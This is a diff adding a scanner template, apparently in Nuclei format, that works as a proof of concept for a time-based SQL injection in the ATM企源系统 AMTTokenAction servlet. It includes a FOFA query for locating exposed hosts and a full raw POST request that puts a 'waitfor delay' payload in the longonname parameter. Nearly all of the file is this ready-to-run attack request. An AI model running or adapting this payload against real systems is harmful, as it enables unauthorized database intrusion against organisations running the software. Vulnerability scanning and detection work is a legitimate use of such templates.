@@ -1,0 +1,37 @@
+id: poc-rvgp4keha3ctrnik
+info:
+  name: ATM企源系统 AMTTokenAction 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rvgp4keha3ctrnik'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rvgp4keha3ctrnik
+    fofa: body="/vmain/login.jsp" || body="com.velcro"
+http:
+- raw:
+  - 'POST /ServiceAction/com.velcro.internal.servlet.AMTTokenAction?action=phone&longonname=1dtvYdVz'';%20waitfor%20delay%20''0:0:5''%20--%20 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Referer:
+
+    Accept-Encoding: gzip,deflate,br
+
+    Content-Length: 0
+
+    Cookie: JSESSIONID=aaaBAhQvyQdO75ezyRr_z
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
